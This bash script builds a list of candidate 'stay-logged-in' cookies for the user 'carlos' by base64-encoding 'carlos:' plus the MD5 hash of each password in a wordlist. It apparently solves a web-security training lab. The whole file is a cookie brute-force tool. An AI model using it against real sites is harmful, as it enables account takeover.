#!/bin/bash

> candidat_cookie.txt

while IFS= read -r pass; do
    md5=$(printf "%s" "$pass" | md5sum | awk '{print $1}')
    printf "carlos:%s" "$md5" | base64 | tr -d '\n' >> candidat_cookie.txt
    printf '\n' >> candidat_cookie.txt
done < password.txt